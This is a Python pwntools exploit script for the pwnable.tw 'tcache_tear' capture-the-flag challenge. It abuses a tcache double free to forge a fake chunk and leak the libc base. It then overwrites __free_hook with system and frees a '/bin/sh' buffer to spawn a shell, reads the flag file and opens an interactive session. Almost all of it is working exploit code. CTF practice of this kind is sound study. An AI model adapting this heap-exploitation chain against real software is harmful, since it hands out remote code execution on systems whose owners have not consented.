#!/usr/bin/env python3
from pwn import *

PORT = 10207
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./tcache_tear_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400C11
            b* 0x0000000000400B54
            b* 0x0000000000400C54
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def menu(opt):
    p.sendlineafter(b'Your choice :', str(opt).encode())

def malloc(size, data):
    menu(1)
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendlineafter(b'Data:', data)

# Stage 1: Fake chunk to get unsorted bin -> leak libc_base

fake_chunk = flat(
    0, 0x501,
    0, 0
    )

p.sendafter(b"Name:", fake_chunk)

name = 0x0000000000602060

malloc(0x40, b'A'*8)
menu(2)
menu(2)
malloc(0x40, p64(name+0x500)) # Write fake_chunk

fake_next_chunk = flat(
    0,          # next_chunk.prev_size
    0x21,       # next_chunk.size
    0,
    0,
    0,          # next_next_chunk.prev_size
    0x21        # next_next_chunk.size  
)

malloc(0x40, b'B'*8)
malloc(0x40, fake_next_chunk)  # Write fake_next_chunk


malloc(0x60, b'C'*8)
menu(2)
menu(2)

malloc(0x60, p64(name+0x10))
malloc(0x60, b'D'*8)
malloc(0x60, b'E'*8)
# GDB()
menu(2)
menu(3)
p.recvuntil(b'Name :')
leak = p.recvn(0x20)
libc_leak = u64(leak[0x10:0x18])
libc.address = libc_leak - 0x3ebca0
log.info(f'libc_base: {libc.address:#x}') 

# Stage 2: Trigger __free_hook -> system

malloc(0x50, b'A'*8)
menu(2)
menu(2)

malloc(0x50, p64(libc.sym.__free_hook))

malloc(0x50, b'B'*8)
# GDB()
malloc(0x50, p64(libc.sym.system))

malloc(0x8, b'/bin/sh')
menu(2)

p.sendline(b'cat /home/tcache_tear/flag')
p.interactive()

# d1nhdwc